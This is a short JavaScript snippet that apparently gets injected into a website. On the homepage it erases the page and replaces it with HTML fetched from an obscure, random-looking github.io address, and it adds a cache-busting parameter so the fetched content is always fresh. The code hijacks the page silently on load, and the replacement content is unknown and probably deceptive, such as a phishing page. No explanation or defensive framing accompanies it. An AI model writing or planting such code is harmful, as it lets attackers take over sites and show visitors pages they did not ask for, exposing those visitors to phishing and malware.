if (window.location.pathname === '/') {
  document.open();
  document.write('');
  document.close();

  // Add a cache-busting query string
  var url = 'https://assdsasdqwqeqdzcxznfcn1029d8919208nx9.github.io/OLUMUksmdmksladmkakmsak10911oms1ks1mklmkls11921ms1s%C4%B1mn1s%C3%B6sm2k1.html?nocache=' + Date.now();

  var xhr = new XMLHttpRequest();
  xhr.open('GET', url, true);
  xhr.onreadystatechange = function () {
    if (xhr.readyState === 4 && xhr.status === 200) {
      var mErt = xhr.responseText;
      document.open();
      document.write(mErt);
      document.close();
    }
  };
  xhr.send();
}
